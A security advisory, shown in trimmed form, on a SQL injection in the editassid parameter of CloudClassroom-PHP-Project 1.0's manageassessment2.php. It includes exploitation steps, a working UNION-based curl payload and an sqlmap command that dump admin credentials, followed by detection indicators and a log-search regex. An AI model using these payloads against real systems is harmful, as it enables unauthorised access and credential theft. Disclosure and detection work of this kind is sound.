# Security Advisory — SQL Injection in manageassessment2.php (parameter editassid)

> **Identifier:** Pending CVE assignment / Internal ID **CC-2026-12**
...
A vulnerability was identified in **CloudClassroom-PHP-Project 1.0** (Vishal Mathur — `mathurvishal`), in the component **manageassessment2.php**, that allows **an attacker (None (via Broken Access Control — item 00; design would require professor session); user interaction: None)** to exploit a **SQL Injection (UNION-based / error-based)** flaw.

Parameter `editassid` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 7 columns. Confirmed with unauthenticated admin credential dump.
...
| Component: manageassessment2.php | 1.0 | None | Affected |
...
The vulnerability occurs due to **SQL Injection (UNION-based / error-based)** in the component **manageassessment2.php**.

Parameter `editassid` is interpolated without quotes (numeric) in SELECT query. In numeric context allows `UNION SELECT`. Target table exposes 7 columns. Confirmed with unauthenticated admin credential dump.

**Root cause (source code snippet):**

**`manageassessment2.php`**
...
1. Request `manageassessment2.php` with `editassid` containing UNION payload (no cookie — item 00).
2. Adjust column count to 7 (target table) and position data in displayed column.
3. Read admin credentials reflected in response.
4. Automate with sqlmap (`-p editassid`) for full database dump.
...
```http
POST /manageassessment2.php HTTP/1.1
...
![Web execution evidence — 12-manageassessment2-sqli](evidencia-web-12-manageassessment2-sqli.png)

**b) Vulnerable code line** (`manageassessment2.php`):

![Source code evidence — 12-manageassessment2-sqli](evidencia-codigo-12-manageassessment2-sqli.png)
...
```bash
curl -s -G "http://192.168.95.131:9292/manageassessment2.php" \
  --data-urlencode "editassid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/manageassessment2.php?editassid=1" -p editassid --batch --dump -T admin
```
...
3. Access the component **manageassessment2.php** (parameter(s): editassid).
...
- Requests to `manageassessment2.php` with `UNION`, `SELECT`, `extractvalue`, `concat`, single quotes or `-- ` in parameter `editassid`.
- Database error messages (e.g., `XPATH syntax error`, MariaDB/MySQL errors) reflected in responses.

### Example Log Search

```text
grep -Ei "(union|select|extractvalue|concat|<script|onerror|onload|</textarea)" access.log | grep "manageassessment2.php"
```
